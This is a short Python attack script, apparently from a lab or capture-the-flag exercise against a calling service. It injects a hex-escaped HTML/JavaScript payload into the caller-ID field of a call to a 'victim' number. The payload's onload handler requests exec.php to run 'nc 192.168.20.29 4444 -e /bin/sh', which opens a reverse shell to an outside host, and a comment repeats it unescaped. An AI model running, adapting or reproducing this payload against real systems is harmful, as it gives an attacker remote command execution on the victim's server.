from attack import Attack
from argparse import ArgumentParser


def encode(val) -> str:
    ret = ""
    for c in val:
        ret += "\\x%02x" % ord(c)
    return ret


parser = ArgumentParser()
parser.add_argument("--verbosity", type=int)
args = parser.parse_args()

# logo = "<img src='resources/images/kill.png' onload=\"q=new XMLHttpRequest();q.open('GET','exec.php?cmd=system nc 192.168.20.29 4444 -e /bin/sh',true);q.send();\">"
# logo = "514353"
logo = "\\x3cimg src='resources\\x2fimages\\x2fkill.png' onload=\"q=new XMLHttpRequest()\\x3bq.open('GET','exec.php?cmd=system nc 192.168.20.29 4444 -e \\x2fbin\\x2fsh',true)\\x3bq.send()\\x3b\"\\x3e"
# logo = "q=new XMLHttpRequest()\\x3bq.open('GET','exec.php?cmd=system nc 192.168.20.29 4444 -e \\x2fbin\\x2fsh',true)\\x3bq.send()\\x3b"

attack = Attack(
    # attacker_number="24356445",
    # attacker_number=encode(logo),
    attacker_number=logo,
    # attacker_number="resources/images/kill.png",
    attacker_port=52058,
    victim_number="1002",
    victim_port=53086)

if args.verbosity:
    attack.register_victim()
    attack.initiate_call()
else:
    attack.close_sockets()
